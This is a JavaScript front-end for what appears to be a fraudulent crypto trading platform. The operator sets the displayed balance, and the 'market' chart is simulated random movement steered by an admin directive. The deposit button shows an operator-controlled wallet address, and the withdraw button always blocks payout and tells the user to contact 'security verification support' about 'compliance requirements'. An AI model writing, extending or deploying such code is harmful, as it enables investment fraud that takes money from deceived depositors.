document.addEventListener('DOMContentLoaded', () => {
    console.log("Core Trading Module v3.0 Online.");

    // 1. Structural Configuration Baseline State Settings
    let targetBaseBalance = 600.00;
    try {
        const cachedBalance = localStorage.getItem('admin_balance');
        if (cachedBalance) targetBaseBalance = parseFloat(cachedBalance);
    } catch (e) {
        console.error("Storage state access failure:", e);
    }

    let activeLiveValue = targetBaseBalance;
    let baselineReferenceTick = activeLiveValue;

    // Build balanced historical trend coordinates
    let technicalDataStream = Array(10).fill(targetBaseBalance).map((val, step) => {
        return val + (step - 5) * (Math.random() * 1.15);
    });

    // Main Asset Render Logic Interface Links
    function pushLiveTickerMetrics(isTrendBullish) {
        const balanceDisplayNode = document.getElementById('balance-display');
        if (balanceDisplayNode) {
            balanceDisplayNode.innerText = '$' + activeLiveValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            balanceDisplayNode.style.color = isTrendBullish ? '#10b981' : '#ef4444';
        }
    }
    pushLiveTickerMetrics(true);

    // 2. High-Fidelity Performance Chart Initialization
    let realTimeChartReference = null;
    const canvasRenderTarget = document.getElementById('LivePerformanceChart');

    function executeChartUpdate(isTrendBullish) {
        if (!canvasRenderTarget || typeof Chart === 'undefined') return;

        if (realTimeChartReference) {
            realTimeChartReference.destroy();
        }

        const renderContext = canvasRenderTarget.getContext('2d');
        const volumetricGradient = renderContext.createLinearGradient(0, 0, 0, canvasRenderTarget.clientHeight || 220);
        
        let aestheticStrokeColor = '#10b981'; // Green UI State Accent
        if (!isTrendBullish) {
            aestheticStrokeColor = '#ef4444'; // Red UI State Accent
            volumetricGradient.addColorStop(0, 'rgba(239, 68, 68, 0.12)');
            volumetricGradient.addColorStop(1, 'rgba(239, 68, 68, 0.00)');
        } else {
            volumetricGradient.addColorStop(0, 'rgba(16, 185, 129, 0.12)');
            volumetricGradient.addColorStop(1, 'rgba(16, 185, 129, 0.00)');
        }

        const historicalTimeLabels = technicalDataStream.map((_, index) => `T-${10 - index}`);

        realTimeChartReference = new Chart(renderContext, {
            type: 'line',
            data: {
                labels: historicalTimeLabels,
                datasets: [{
                    data: [...technicalDataStream],
                    borderColor: aestheticStrokeColor,
                    borderWidth: 2.2,
                    pointRadius: 0,
                    tension: 0.32,
                    fill: true,
                    backgroundColor: volumetricGradient
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                animation: { duration: 750 }, // Highly dampened smooth transition curve
                plugins: { legend: { display: false } },
                scales: {
                    x: { display: false },
                    y: {
                        grid: { color: 'rgba(51, 65, 85, 0.06)', drawBorder: false },
                        ticks: {
                            color: '#64748b',
                            font: { size: 10 },
                            callback: function(numericValue) { return '$' + numericValue.toFixed(2); }
                        }
                    }
                }
            }
        });
    }

    executeChartUpdate(true);

    // 3. Low-Volatility Simulation Calculation Engine (Executes every 6.0 Seconds)
    setInterval(() => {
        const structuralTrendDirective = localStorage.getItem('chart_trend_directive') || 'stable';
        
        baselineReferenceTick = activeLiveValue;
        
        // Highly dampened value swing metrics to stop sharp drops or spikes
        let incrementalDeltaValue = (Math.random() - 0.5) * 0.45;

        if (structuralTrendDirective === 'upward') {
            incrementalDeltaValue += 0.18; // Gradual climb
        } else if (structuralTrendDirective === 'downward') {
            incrementalDeltaValue -= 0.22; // Gradual descent
        }

        activeLiveValue += incrementalDeltaValue;
        if (activeLiveValue < 0) activeLiveValue = 0;

        const evaluatedDirectionState = activeLiveValue >= baselineReferenceTick;

        technicalDataStream.push(activeLiveValue);
        technicalDataStream.shift();

        pushLiveTickerMetrics(evaluatedDirectionState);
        executeChartUpdate(evaluatedDirectionState);
    }, 6000);

    // 4. Integrated Dynamic Transaction Overlay Router
    const globalActionButtons = document.querySelectorAll('button');
    let quickDepositTriggerNode = null;
    let withdrawFundsTriggerNode = null;

    globalActionButtons.forEach(buttonElement => {
        const textContent = buttonElement.innerText || "";
        if (textContent.includes('Deposit')) {
            quickDepositTriggerNode = buttonElement;
        } else if (textContent.includes('Withdraw')) {
            withdrawFundsTriggerNode = buttonElement;
        }
    });

    // Secure Inbound Address Modal Presentation Link
    if (quickDepositTriggerNode) {
        quickDepositTriggerNode.addEventListener('click', () => {
            const multiCurrencyModal = document.getElementById('deposit-modal') || document.querySelector('.modal-deposit');
            if (multiCurrencyModal) {
                multiCurrencyModal.style.display = 'flex';
            } else {
                // Fallback rendering structure for address routing interfaces
                const activeNetworkAsset = localStorage.getItem('forced_network') || 'USDT (TRC20)';
                const functionalWalletAddress = localStorage.getItem('admin_address') || '0x71C2496E7278274d3b4614a420971a9E3a9411bb';
                alert(`Asset Inbound Routing Gateway:\n━━━━━━━━━━━━━━━━━━━━\nAsset Token: ${activeNetworkAsset}\nTarget Address Node: ${functionalWalletAddress}\n\nStatus: Awaiting network verification transaction confirmation...`);
            }
        });
    }

    // Secure Verification Processing Interceptor Link
    if (withdrawFundsTriggerNode) {
        withdrawFundsTriggerNode.addEventListener('click', () => {
            const validationModalWindow = document.getElementById('withdraw-modal') || document.querySelector('.modal-withdraw');
            if (validationModalWindow) {
                validationModalWindow.style.display = 'flex';
            } else {
                // Fallback verification communication layout prompt
                alert("Security Message Gateway:\n━━━━━━━━━━━━━━━━━━━━\nYour pending request requires manual validation processing.\n\nPlease contact security verification support live chat immediately to clear compliance requirements and execute the payout request.");
            }
        });
    }

    // 5. Shared Global Storage Pipeline Synchronizer Link
    window.addEventListener('storage', (storageContextEvent) => {
        if (!storageContextEvent.newValue) return;

        if (storageContextEvent.key === 'admin_balance') {
            targetBaseBalance = parseFloat(storageContextEvent.newValue) || 600.00;
            activeLiveValue = targetBaseBalance;
            baselineReferenceTick = activeLiveValue;
            technicalDataStream = Array(10).fill(targetBaseBalance);
            
            pushLiveTickerMetrics(true);
            executeChartUpdate(true);
        }
    });
});
